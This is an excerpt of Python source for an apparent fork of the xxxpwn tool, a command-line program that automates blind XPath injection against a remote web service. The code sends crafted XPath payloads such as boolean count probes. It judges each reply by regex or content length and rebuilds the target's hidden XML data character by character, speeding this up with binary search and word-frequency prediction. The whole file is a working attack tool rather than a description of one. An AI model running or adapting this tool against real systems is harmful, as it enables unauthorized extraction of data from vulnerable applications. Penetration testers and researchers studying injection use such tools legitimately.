...
'''
A fork of xxxpwn (https://github.com/feakk/xxxpwn) adding further optimizations
 and tweaks. Uses predictive text based on a dictionary of words/phrases vs
frequencies of occurence (incorporated from
https://github.com/nyghtowl/Predictive_Txt_Ex)
...
def get_quoted_chars(chars):
    ...
    if SINGLE_QUOTE in chars:
        ...
        enc_payload_a = encode_payload(pt_a)
        enc_payload_b = encode_payload(pt_b)

        use_chars = f"""concat('{enc_payload_a}',"'",'{enc_payload_b}')"""
    ...
    if trie_root is not None:
        ...
        if len(words) > 1:
            ...
            pred_chars = trie.predict(trie_root, words[-1], result=pred_chars,
                                      strip_so_far=True, add_freqs=True,
                                      no_new=True, max_new_chars=1)
...
def list_intersect(ordered_list, intersect):
    ...
    return ordered_list.translate(None,
                                  ordered_list.translate(None, intersect))
...
def to_lower(node):
    ...
    if args.use_lowercase:
        for r in string.uppercase:
            node = node.replace(r, '')
        node = f'translate({node},"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz")'  # noqa
    return node
...
def match_similar(node, node_set, definitely_matches=False):
    ...
    if args.prediscover_strlen and len(matches) >= thres_match_count:
        strlen = get_count_bst("string-length(%s)" %
                               node, args.len_high, args.len_low)
    ...
    # character position among the recorded ones and check against that
    # property TODO or string length, or contained character
    ...
    assert matches
    # we should have reduced it at least by 1
    assert len(matches) < len(node_set)
...
def get_character_bst(node, position, chars):
    ...
    while len(chars) > 0:
        ...
        if len(chars) == 1:
            ...
            cmd = "contains(%s,substring(%s,%i,1))" % (
...
def get_character_smart(node, position, char_freq_groups):
    ...
    for chars in char_freq_groups:
        print_dbg('Frequency band %i: trying character group "%r"' %
                  (band, chars))
    ...
    if new_c is None:
        sys.stderr.write(("\n#Error: "
                         f"{node} at postion {position}"
                          " is not in provided character set#\n"))
        sys.stdout.flush()
        new_c = BAD_CHAR
    return new_c
...
def get_xml_details():
    ...
    if args.global_count:
        ...
        elements_total = nodes_total + attributes_total + comments_total + text_total  # noqa
...
def get_xml_bst(node, level=0):
    ...
    child_count = attribute_count = comment_count = instruction_count = text_count = 0  # noqa
...
def xml_search(string_literal):
    ...
    if not args.no_comments:
        comment_count = get_count_bst("count(//comment()[%s(%s,%s)])" %
                                      (match, node, string_literal))
        print("### Found %s in %i comments(s)  ###" %
              (string_literal, comment_count))
        for c in range(1, comment_count+1):
    ...
    if not args.no_processor:
        instruction_count = get_count_bst("count(//processing-instruction()[%s(%s,%s)])" %
                                          (match, node, string_literal))
        print("### Found %s in %i instruction(s)  ###" %
              (string_literal, instruction_count))
        for i in range(1, instruction_count+1):
...
def attack(inject):
    ...
    is_http = False
    is_ip = bool(re.match(r'^([0-9]{1,3}\.){3}[0-9]{1,3}$', args.host))
...
if __name__ == "__main__":
    ...
    # Regex match options
    parser_string = subparsers.add_parser(
        'regex', help='Determine successful injection based on presence of regular expression in reply')
    parser_string.add_argument(
        "match", help="Regular expression that is present on successful injection")
    parser_string.add_argument("--case", help="Perform case-sensitive string matches (default: insensitive)",
                               dest="match_case", action='store_const', const=0, default=re.IGNORECASE)
    parser_string_group = parser_string.add_mutually_exclusive_group()
    parser_string_group.add_argument(
        "--headers", help="For HTTP, search only in response headers (default: False)", dest="match_loc", action='store_const', const='head')
    parser_string_group.add_argument(
        "--body", help="For HTTP, search only in response body (default: False)", dest="match_loc", action='store_const', const='body')

    # Content length match options
    parser_length = subparsers.add_parser(
        'length', help='Determine successful injection based on content length')
    parser_length.add_argument(
        "match", help="Content length of reply on successful injection", type=pos_int)
    parser_length_group = parser_length.add_mutually_exclusive_group()
    parser_length_group.add_argument("--min", help="Match on any content length greater than or equal to the given one (default: exact length)",
                                     dest="match_op", action='store_const', const=operator.ge, default=operator.eq)
    parser_length_group.add_argument("--max", help="Match on any content length less than or equal to the given one (default: exact length)",
                                     dest="match_op", action='store_const', const=operator.le, default=operator.eq)
    ...
    # Global options
    parser.add_argument(
        "-V", "--version", help="print version and exit", action='version', version=VERSION)
    parser.add_argument("--debug", help="print debugging messages",
                        action='store_true', dest='debug', default=False)
    parser.add_argument("-r", "--reverse-match", help="Make a positive match indicate a failed injection",
                        dest="match_fail", action='store_true', default=False)
    parser.add_argument("-U", "--urlencode", help="URL encode key characters in payload",
                        dest="urlencode", action="store_true", default=False)
    parser.add_argument("-H", "--htmlencode", help="HTML Encode key characters in payload",
                        dest="htmlencode", action="store_true", default=False)
    parser.add_argument("-s", "--ssl", help="Use SSL for connection",
                        dest="use_ssl", action="store_true", default=False)
    parser.add_argument("-p", "--port", help="Port number (default: 80 or 443 if using SSL)",
                        type=pos_int, dest="port", metavar='PORT')

    group_test = parser.add_argument_group('Retrieval options')
    group_test.add_argument(
        "-e", "--example", help="Test injection with an example injection request", dest="example", metavar='PAYLOAD')
    group_test.add_argument("--summary", help="print XML summary information only",
                            dest="summary", action="store_true", default=False)
    group_test.add_argument("--max_name_length", help="Retrieve only up to N characters for every node/attribute name",
                            type=nonneg_int, dest="max_name_len", metavar='N')
    group_test.add_argument("--max_content_length", help="Retrieve only up to N characters for every node/attribute content",
                            type=nonneg_int, dest="max_cont_len", metavar='N')
    group_test.add_argument("--no_root", help="Disable accessing comments/instructions in root",
                            dest="no_root", action="store_true", default=False)
    group_test.add_argument("--no_comments", help="Disable accessing comments/instructions in retrieval",
                            dest="no_comments", action="store_true", default=False)
    group_test.add_argument("--no_processor", help="Disable accessing comments nodes",
                            dest="no_processor", action="store_true", default=False)
    group_test.add_argument("--no_attributes", help="Disable accessing attributes",
                            dest="no_attributes", action="store_true", default=False)
    group_test.add_argument("--no_values", help="Disable accessing attribute values",
                            dest="no_values", action="store_true", default=False)
    group_test.add_argument("--no_text", help="Disable accessing text nodes",
                            dest="no_text", action="store_true", default=False)
    group_test.add_argument("--no_child", help="Disable accessing child nodes",
                            dest="no_child", action="store_true", default=False)

    group_adv_cs = parser.add_argument_group(
        'Advanced options for character prediction')
    parser_trie_dic_group = group_adv_cs.add_mutually_exclusive_group()
    parser_trie_dic_group.add_argument(
        "-d", "--dictionary", help="A delimited file containing words (column 1) and frequencies (column 2).", dest="trie_dic", metavar='FILE')
    parser_trie_dic_group.add_argument(
        "-D", "--bin_dictionary", help="The .pickle file generated by us using a previous delimited ASCII dictionary", dest="trie_pickle", metavar='FILE')
    # TODO: add to default list of numeric nodes
    parser_trie_dic_group.add_argument("--numeric_nodes", help="Node/attribute names matching the given regular expression prioritize --numeric_characters",
                                       dest="numeric_nodes", default=r'(_|\b)id(_|\b)|(_|\b)number(_|\b)|(_|\b)mobile(_|\b)|phone(_|\b)|(_|\b)fax(_|\b)|(_|\b)price(_|\b)', metavar='REGEX')
    group_adv_cs.add_argument("--trie_delim", help="Delimiter for trie dictionary file",
                              dest="trie_delim", default="\t", metavar='CHARACTER')
    group_adv_cs.add_argument("-o", "--optimize_charset", help="Optimize character set globally and for any string length over %i" %
                              COUNT_OPTIMIZE, dest="optimize_charset", action="store_true", default=False)
    ...
    group_adv_cs.add_argument("--unicode", help="Include Unicode characters to search space",
                              dest="unicode", action="store_true", default=False)

    group_adv = parser.add_argument_group('Other advanced options')
    group_adv.add_argument("-l", "--lowercase", help="Optimize further by reducing injection to lowercase matches",
                           dest="use_lowercase", action="store_true", default=False)
    group_adv.add_argument("-g", "--global_count", help="Maintain global count of nodes",
                           dest="global_count", action="store_true", default=False)
    group_adv.add_argument("-n", "--normalize_space", help="Normalize whitespace",
                           dest="normalize_space", action="store_true", default=False)
    group_adv.add_argument("-L", "--use_strlen", help="Don't find out the length of a value before querying it character by character. This may work better if using prediction.",
                           dest="prediscover_strlen", action="store_false", default=True)
    group_adv.add_argument("-x", "--xml_match", help="Match current nodes to previously recovered data",
                           dest="xml_match", action="store_true", default=False)
    group_adv.add_argument("--len_low", help="Start guessing string lengths are at least N characters",
                           type=nonneg_int, dest="len_low", default=0, metavar='N')
    group_adv.add_argument("--len_high", help="Start guessing string lengths are at most N characters",
                           type=pos_int, dest="len_high", default=16, metavar='N')
    group_adv.add_argument("--start_node", help="Start recovery at given node",
                           dest="start_node", default=ROOT_NODE, metavar='NODE')
    ...
    group_adv.add_argument("--xpath2", help="Check for presence of XPath 2.0 functions",
                           dest="xpath2", action="store_true", default=False)
    group_adv.add_argument(
        "--search", help="print all string matches (use -l for case-insensitive)", dest="search", metavar='STRING')
    group_adv.add_argument("--search_start", help="Search only at start of node",
                           dest="search_start", action="store_true", default=False)
    ...
    if args.len_low > args.len_high or args.len_low == args.len_high:
        parser.error("Invalid character length matching parameters. Must be set as %i >= %i:" % (
    ...
    if args.use_lowercase:
        for r in string.uppercase:
            args.character_set = args.character_set.replace(r, '')
    ...
    if not attack(encode_payload("count(//*) and 2>1")):
        ...
        sys.stderr.write(
            "### If you know injection location is correct, please examine use of -U and -H flags###\n")
        exit(3)
    ...
    if args.xpath2:
        if attack(encode_payload("lower-case('A')='a'")):
            sys.stderr.write(
                "### Looks like %s:%i supports XPath 2.0 injection via lower-case(), consider using xcat (https://github.com/orf/xcat)  ###\n" % (args.host, args.port))
            exit(3)
    if args.unicode:
    ...
    if args.trie_pickle is not None:
        ...
        try:
            ...
            sys.stderr.write(
                "Error: Dictionary has the only one column, check delimiter: %s\n" % e)
            exit(3)
    ...
    if not args.summary:
        ...
        try:
            ...
            print(xml.dom.minidom.parseString(
                xml_content).toprettyxml(encoding='utf-8'))
        except xml.parsers.expat.ExpatError as e:
            sys.stderr.write(
                "### Unable to process as complete XML document '%s', re-printing raw XML###\n" % e)
            print(xml_content)

        if args.global_count:
            print("### XML Elements Remaining: Nodes: %i, Attributes: %i, Comments: %i, Instructions: %i, Text: %i  ###" % (
                nodes_total, attributes_total, comments_total, instructions_total, text_total))
